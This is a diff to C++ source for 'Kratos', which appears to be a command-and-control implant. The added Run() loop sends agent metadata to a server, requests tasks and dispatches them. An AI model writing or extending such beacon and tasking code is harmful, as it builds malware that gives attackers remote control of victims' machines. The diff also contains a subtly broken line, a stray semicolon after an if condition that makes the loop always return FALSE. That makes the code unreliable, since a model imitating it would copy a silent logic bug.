@@ -1,5 +1,6 @@
 #include "agent/core.h"
 #include "packager/packager.h"
+#include "net/net.h"
 
 Kratos* kratos = NULL;
 
@@ -15,8 +16,37 @@ Kratos* kratos = NULL;
 
 
 
-BOOL Kratos::Run() {
+BOOL Kratos::Run( ) {
 
+	packager->NewPacker( );
+	packager->PrepareMetaData( this->AgentID );
+
+	for ( ;; ) {
+		if ( ! net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize ) ) {
+			return FALSE;
+		}
+
+		if ( net->DataSize( ) == 0) {
+			packager->Pack4( MSG_GETTASK );
+		}
+		else {
+			if ( ! tasker->Dispatch( ) ); { return FALSE; }
+		}
+		/*packager->NewUnPacker( net->Data( ), net->DataSize( ) );
+
+		INT32 RespCode = packager->UnPack4( );
+		if ( RespCode != RESP_NO_TASKS ) {
+			packager->Pack4( MSG_OUTPUT );
+			tasker->Dispatch( net->Data( ), net->DataSize( ) );
+		}
+		else {
+			packager->Pack4( MSG_GETTASK );
+		}*/
+
+		
+
+
+	}
 
 
 
